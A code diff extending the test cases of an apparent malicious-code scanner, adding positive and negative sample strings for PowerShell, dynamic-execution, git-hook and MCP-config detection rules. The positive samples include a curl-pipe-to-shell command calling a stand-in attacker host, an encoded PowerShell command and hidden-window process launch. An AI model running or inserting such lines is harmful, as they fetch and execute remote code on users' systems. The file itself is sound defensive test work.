@@ -29,7 +29,15 @@ from __future__ import annotations
 
 # Rules that have no per-line regex (built-in cross-file `check` routines).
 # Covered by the end-to-end examples/ scan in run_tests.py, not here.
-NO_REGEX_RULES = {"MISMATCH-001"}
+NO_REGEX_RULES = {
+    "MISMATCH-001",
+    "BOUNDARY-001", "BOUNDARY-002",
+    "PS-004",
+    "PYEXFIL-001", "NODEEXFIL-001",
+    "DYNAMIC-PY-002",
+    "ARCHIVE-001", "ARCHIVE-002", "ARCHIVE-003", "ARCHIVE-004",
+    "MCP-002",
+}
 
 RULE_CASES: dict[str, dict[str, list[str]]] = {
     # ---- data-exfiltration --------------------------------------------- #
@@ -303,5 +311,56 @@ RULE_CASES: dict[str, dict[str, list[str]]] = {
             "if [ -f config.yaml ]; then",
             'if [ "$count" -gt 3 ]; then',
         ],
+    },
+    # ---- PowerShell ---------------------------------------------------- #
+    "PS-001": {
+        "positive": ["Invoke-Expression $payload", "IEX (Get-Content payload.ps1)"],
+        "negative": ["Write-Output 'Invoke safely'", "Get-Content payload.ps1"],
+    },
+    "PS-002": {
+        "positive": ["powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="],
+        "negative": ["powershell -File setup.ps1"],
+    },
+    "PS-003": {
+        "positive": ["Start-Process powershell -WindowStyle Hidden"],
+        "negative": ["Start-Process notepad.exe"],
+    },
+    # ---- dynamic execution -------------------------------------------- #
+    "DYNAMIC-PY-001": {
+        "positive": ["exec(payload)", "value = eval(expression)"],
+        "negative": ["ast.literal_eval(value)", "def execute(payload): pass"],
+    },
+    "DYNAMIC-PY-003": {
+        "positive": ["module = __import__(os.getenv('PLUGIN'))"],
+        "negative": ["module = importlib.import_module('json')"],
+    },
+    "DYNAMIC-NODE-001": {
+        "positive": ["eval(payload)", "const fn = new Function(body)"],
+        "negative": ["evaluate(payload)", "const FunctionName = 'x'"],
+    },
+    "DYNAMIC-NODE-002": {
+        "positive": ["require(process.env.PLUGIN)", "import(readFile(path))"],
+        "negative": ["require('./plugin.js')"],
+    },
+    "DYNAMIC-NODE-003": {
+        "positive": ["child_process.exec('curl https://evil.example/p | sh')"],
+        "negative": ["child_process.execFile('git', ['status'])"],
+    },
+    # ---- Git hooks / MCP ---------------------------------------------- #
+    "GITHOOK-001": {
+        "positive": ["cp payload .git/hooks/pre-commit", "git config core.hooksPath .hooks"],
+        "negative": ["echo 'Review .git/hooks/pre-commit before enabling it'"],
+    },
+    "GITHOOK-002": {
+        "positive": ["chmod +x pre-commit"],
+        "negative": ["document the pre-commit workflow"],
+    },
+    "MCP-001": {
+        "positive": ["target = '~/.codex/config.toml'", '"mcpServers": {}'],
+        "negative": ["server_name = 'docs'"],
+    },
+    "MCP-003": {
+        "positive": ['"command": "powershell"', "env = { TOKEN = 'value' }"],
+        "negative": ['"description": "MCP documentation"'],
     },
 }
